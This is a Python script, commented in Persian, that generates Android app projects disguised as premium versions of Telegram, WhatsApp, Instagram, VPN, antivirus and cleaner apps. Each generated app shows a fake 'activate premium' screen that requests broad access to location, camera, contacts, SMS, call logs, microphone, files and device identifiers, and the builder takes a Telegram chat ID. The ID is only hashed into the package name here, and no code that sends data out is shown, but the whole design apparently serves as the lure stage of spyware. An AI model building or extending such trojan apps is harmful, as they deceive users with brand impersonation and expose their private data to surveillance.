from __future__ import annotations

import hashlib
import html
import os
import urllib.request
from pathlib import Path


# ============================================================
#  قالب‌ها
# ============================================================
TEMPLATES = {
    "telegram":  {"title": "Telegram Premium",  "color": "#229ED9", "pkg": "org.premium.telegram"},
    "whatsapp":  {"title": "WhatsApp Plus",     "color": "#25D366", "pkg": "com.plus.whatsapp"},
    "instagram": {"title": "Instagram Pro",     "color": "#E4405F", "pkg": "com.pro.instagram"},
    "vpn":       {"title": "VPN Unlimited",     "color": "#00C853", "pkg": "com.unlimited.vpn"},
    "antivirus": {"title": "Antivirus Pro",     "color": "#FF1744", "pkg": "com.pro.antivirus"},
    "battery":   {"title": "Battery Saver Pro", "color": "#FDD835", "pkg": "com.pro.battery"},
    "cleaner":   {"title": "Phone Cleaner",     "color": "#00BCD4", "pkg": "com.cleaner.phone"},
    "boost":     {"title": "Game Booster Pro",  "color": "#FF6D00", "pkg": "com.pro.gameboost"},
}


# ============================================================
#  مجوزها برای هر قابلیت (فقط مجوزهای معتبر)
# ============================================================
FEATURE_PERMISSIONS = {
    "location": [
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
    ],
    "camera": [
        "android.permission.CAMERA",
        "android.permission.WRITE_EXTERNAL_STORAGE",
    ],
    "contacts": [
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.GET_ACCOUNTS",
    ],
    "sms": [
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.SEND_SMS",
    ],
    "call_log": [
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.CALL_PHONE",
    ],
    "gallery": [
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
    ],
    "mic": [
        "android.permission.RECORD_AUDIO",
    ],
    "files": [
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
    ],
    "clipboard": [],   # بدون مجوز
    "device": [
        "android.permission.READ_PHONE_STATE",
    ],
}


# ============================================================
#  توضیحات زیبا برای هر قابلیت
# ============================================================
FEATURE_DESCRIPTIONS = {
    "location":  ("📍", "دسترسی به موقعیت مکانی", "دقت بالا با GPS"),
    "camera":    ("📸", "دسترسی به دوربین", "عکس و فیلم‌برداری"),
    "contacts":  ("📇", "دسترسی به مخاطبین", "خواندن و ذخیره"),
    "sms":       ("✉️", "دسترسی به پیامک", "خواندن و ارسال"),
    "call_log":  ("📞", "دسترسی به لاگ تماس", "همه تماس‌ها"),
    "gallery":   ("🖼", "دسترسی به گالری", "تصاویر و ویدیوها"),
    "mic":       ("🎤", "دسترسی به میکروفون", "ضبط صدا"),
    "files":     ("📁", "دسترسی به فایل‌ها", "مدیریت فایل‌ها"),
    "clipboard": ("📋", "دسترسی به کلیپ‌بورد", "کپی و پیست"),
    "device":    ("📱", "اطلاعات دستگاه", "IMEI و شماره"),
}


# ============================================================
#  ساخت MainActivity.java
# ============================================================
def build_main_activity(features: list[str], template: dict, app_name: str) -> str:
    # ساخت لیست permission های اصلی جاوا
    java_perms = []
    for f in features:
        for perm in FEATURE_PERMISSIONS.get(f, []):
            short_name = perm.replace("android.permission.", "")
            java_ref = f"Manifest.permission.{short_name}"
            if java_ref not in java_perms:
                java_perms.append(java_ref)

    perms_block = ",\n            ".join(java_perms) if java_perms else ""

    # ساخت feature info برای نمایش
    feature_info_java = ""
    for f in features:
        icon, title, desc = FEATURE_DESCRIPTIONS.get(f, ("✨", f, ""))
        feature_info_java += f'''
        addFeatureCard(root, "{icon}", "{title}", "{desc}");'''

    return f'''package com.generated.app;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {{

    private TextView statusView;
    private Button activateButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(Color.parseColor("{template['color']}"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 96, 48, 96);
        root.setGravity(Gravity.CENTER_HORIZONTAL);

        // ============ لوگو ============
        TextView logo = new TextView(this);
        logo.setText("✨");
        logo.setTextSize(72);
        logo.setGravity(Gravity.CENTER);
        logo.setPadding(0, 0, 0, 24);
        root.addView(logo);

        // ============ عنوان ============
        TextView title = new TextView(this);
        title.setText("{template['title']}");
        title.setTextSize(32);
        title.setTextColor(Color.WHITE);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 16);
        root.addView(title);

        // ============ خط جداکننده ============
        TextView line = new TextView(this);
        line.setText("━━━━━━━━━━━━━━━━━━━━━");
        line.setTextSize(14);
        line.setTextColor(Color.argb(100, 255, 255, 255));
        line.setGravity(Gravity.CENTER);
        line.setPadding(0, 8, 0, 24);
        root.addView(line);

        // ============ زیرعنوان ============
        TextView subtitle = new TextView(this);
        subtitle.setText("نسخه پریمیوم فعال شد");
        subtitle.setTextSize(18);
        subtitle.setTextColor(Color.WHITE);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);
        root.addView(subtitle);

        // ============ قابلیت‌ها ============
        TextView featuresTitle = new TextView(this);
        featuresTitle.setText("🎯 قابلیت‌های فعال:");
        featuresTitle.setTextSize(16);
        featuresTitle.setTextColor(Color.WHITE);
        featuresTitle.setTypeface(null, Typeface.BOLD);
        featuresTitle.setPadding(0, 0, 0, 24);
        root.addView(featuresTitle);

        {feature_info_java}

        // ============ دکمه فعال‌سازی ============
        activateButton = new Button(this);
        activateButton.setText("🚀 فعال‌سازی نسخه پریمیوم");
        activateButton.setTextSize(18);
        activateButton.setPadding(48, 32, 48, 32);
        activateButton.setBackgroundColor(Color.WHITE);
        activateButton.setTextColor(Color.parseColor("{template['color']}"));
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 48, 0, 24);
        activateButton.setLayoutParams(btnParams);
        activateButton.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                requestAllPermissions();
            }}
        }});
        root.addView(activateButton);

        // ============ نمایش وضعیت ============
        statusView = new TextView(this);
        statusView.setText("برای ادامه، دکمه بالا را بزنید");
        statusView.setTextSize(14);
        statusView.setTextColor(Color.WHITE);
        statusView.setGravity(Gravity.CENTER);
        statusView.setPadding(0, 16, 0, 0);
        root.addView(statusView);

        scroll.addView(root);
        setContentView(scroll);
    }}

    private void addFeatureCard(LinearLayout parent, String icon, String title, String desc) {{
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setBackgroundColor(Color.argb(30, 255, 255, 255));
        card.setPadding(24, 16, 24, 16);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 6, 0, 6);
        card.setLayoutParams(params);

        TextView iconView = new TextView(this);
        iconView.setText(icon);
        iconView.setTextSize(24);
        iconView.setPadding(0, 0, 24, 0);
        card.addView(iconView);

        LinearLayout textLayout = new LinearLayout(this);
        textLayout.setOrientation(LinearLayout.VERTICAL);
        textLayout.setLayoutParams(new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        TextView titleView = new TextView(this);
        titleView.setText(title);
        titleView.setTextSize(15);
        titleView.setTextColor(Color.WHITE);
        titleView.setTypeface(null, Typeface.BOLD);
        textLayout.addView(titleView);

        TextView descView = new TextView(this);
        descView.setText(desc);
        descView.setTextSize(12);
        descView.setTextColor(Color.argb(200, 255, 255, 255));
        textLayout.addView(descView);

        card.addView(textLayout);
        parent.addView(card);
    }}

    private void requestAllPermissions() {{
        List<String> needed = new ArrayList<>();

        if ({len(java_perms) > 0}) {{
            String[] allPerms = {{
                {perms_block}
            }};
            for (String p : allPerms) needed.add(p);
        }}

        if (Build.VERSION.SDK_INT >= 23) {{
            List<String> missing = new ArrayList<>();
            for (String p : needed) {{
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {{
                    missing.add(p);
                }}
            }}

            if (!missing.isEmpty()) {{
                requestPermissions(missing.toArray(new String[0]), 100);
                statusView.setText("⏳ منتظر تأیید " + missing.size() + " مجوز...");
            }} else {{
                statusView.setText("✅ همه مجوزها داده شد!\\n\\n🎉 برنامه فعال است");
            }}
        }} else {{
            statusView.setText("✅ برنامه فعال شد");
        }}
    }}

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {{
        super.onRequestPermissionsResult(requestCode, permissions, results);

        int granted = 0;
        int denied = 0;
        for (int r : results) {{
            if (r == PackageManager.PERMISSION_GRANTED) granted++;
            else denied++;
        }}

        if (denied == 0) {{
            statusView.setText("✅ همه " + granted + " مجوز داده شد!\\n\\n🎉 برنامه فعال است");
            activateButton.setText("✅ فعال شد");
            activateButton.setEnabled(false);
        }} else {{
            statusView.setText("⚠️ " + granted + " مجوز داده شد، " + denied + " رد شد.\\n\\nدوباره تلاش کنید.");
        }}
    }}
}}
'''


# ============================================================
#  ساخت AndroidManifest.xml
# ============================================================
def build_manifest(features: list[str]) -> str:
    all_perms = set()
    for f in features:
        for p in FEATURE_PERMISSIONS.get(f, []):
            all_perms.add(p)

    perms_xml = "\n    ".join(
        f'<uses-permission android:name="{p}" />' for p in sorted(all_perms)
    )

    return f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    {perms_xml}

    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.location" android:required="false" />
    <uses-feature android:name="android.hardware.location.gps" android:required="false" />
    <uses-feature android:name="android.hardware.microphone" android:required="false" />
    <uses-feature android:name="android.hardware.telephony" android:required="false" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
'''


# ============================================================
#  Main Function
# ============================================================
def main() -> None:
    name = os.environ.get("APP_NAME", "").strip()
    telegram_chat = os.environ.get("CHAT_ID", "").strip()
    features_str = os.environ.get("FEATURES", "").strip()
    template_key = os.environ.get("TEMPLATE", "telegram").strip()
    icon_url = os.environ.get("ICON_URL", "").strip()

    # ============ ولیدیشن ============
    if not name:
        raise SystemExit("APP_NAME is required")
    if not telegram_chat:
        raise SystemExit("CHAT_ID is required")
    if len(name) > 32:
        raise SystemExit("APP_NAME too long (max 32)")
    if any(ord(ch) < 32 for ch in name):
        raise SystemExit("APP_NAME contains invalid chars")

    # ============ Features ============
    features = [f.strip() for f in features_str.split(",") if f.strip()]
    # فقط قابلیت‌های معتبر
    features = [f for f in features if f in FEATURE_PERMISSIONS]
    if not features:
        features = ["device"]  # پیش‌فرض

    # ============ Template ============
    template = TEMPLATES.get(template_key, TEMPLATES["telegram"])

    # ============ Package ============
    app_hash = hashlib.sha256(
        f"{telegram_chat}:{name}:{template_key}".encode("utf-8")
    ).hexdigest()[:10]
    app_id = f"{template['pkg']}.a{app_hash}"

    root = Path.cwd()

    # ============================================================
    #  ساخت تمام فایل‌ها
    # ============================================================
    files = {}

    # ---------- settings.gradle ----------
    files["settings.gradle"] = """pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = 'GeneratedApp'
include ':app'
"""

    # ---------- build.gradle ----------
    files["build.gradle"] = """plugins {
    id 'com.android.application' version '8.7.3' apply false
}
"""

    # ---------- gradle.properties ----------
    files["gradle.properties"] = """org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
android.useAndroidX=true
android.enableJetifier=true
android.nonTransitiveRClass=true
"""

    # ---------- app/build.gradle ----------
    files["app/build.gradle"] = f"""plugins {{
    id 'com.android.application'
}}

android {{
    namespace 'com.generated.app'
    compileSdk 35
    defaultConfig {{
        applicationId '{app_id}'
        minSdk 23
        targetSdk 35
        versionCode 1
        versionName '1.0'
    }}
    buildTypes {{
        release {{
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }}
}}
"""

    # ---------- proguard-rules.pro ----------
    files["app/proguard-rules.pro"] = """# Default ProGuard rules
-dontwarn android.**
"""

    # ---------- AndroidManifest.xml ----------
    files["app/src/main/AndroidManifest.xml"] = build_manifest(features)

    # ---------- strings.xml ----------
    features_xml = "\n        ".join(
        f'<item>{html.escape(f)}</item>' for f in features
    )

    files["app/src/main/res/values/strings.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name" formatted="false">{html.escape(name, quote=False)}</string>
    <string-array name="features">
        {features_xml}
    </string-array>
</resources>
"""

    # ---------- styles.xml ----------
    files["app/src/main/res/values/styles.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
        <item name="android:colorAccent">{template['color']}</item>
    </style>
</resources>
"""

    # ---------- colors.xml ----------
    files["app/src/main/res/values/colors.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="primary">{template['color']}</color>
    <color name="white">#FFFFFF</color>
</resources>
"""

    # ---------- MainActivity.java ----------
    files["app/src/main/java/com/generated/app/MainActivity.java"] = build_main_activity(
        features, template, name
    )

    # ---------- آیکون ----------
    icon_path = root / "app/src/main/res/mipmap-hdpi/ic_launcher.png"
    icon_path.parent.mkdir(parents=True, exist_ok=True)

    if icon_url:
        try:
            urllib.request.urlretrieve(icon_url, icon_path)
            print(f"✅ Icon downloaded: {icon_url}")
        except Exception as e:
            print(f"⚠️ Icon error: {e}")
            # آیکون پیش‌فرض
            _create_default_icon(icon_path)
    else:
        _create_default_icon(icon_path)

    # ============================================================
    #  ذخیره همه فایل‌ها
    # ============================================================
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")

    print(f"✅ Generated: {app_id}")
    print(f"   Template: {template['title']}")
    print(f"   Features: {len(features)} ({', '.join(features)})")


def _create_default_icon(icon_path: Path):
    """ساخت آیکون پیش‌فرض PNG"""
    try:
        # PNG 1x1 خالی (base64)
        png_1x1 = bytes([
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
            0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41,
            0x54, 0x78, 0x9C, 0x63, 0xF8, 0x0F, 0x00, 0x00,
            0x01, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB0,
            0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
            0xAE, 0x42, 0x60, 0x82,
        ])
        icon_path.write_bytes(png_1x1)
        print(f"✅ Default icon created")
    except Exception as e:
        print(f"⚠️ Icon error: {e}")


if __name__ == "__main__":
    main()
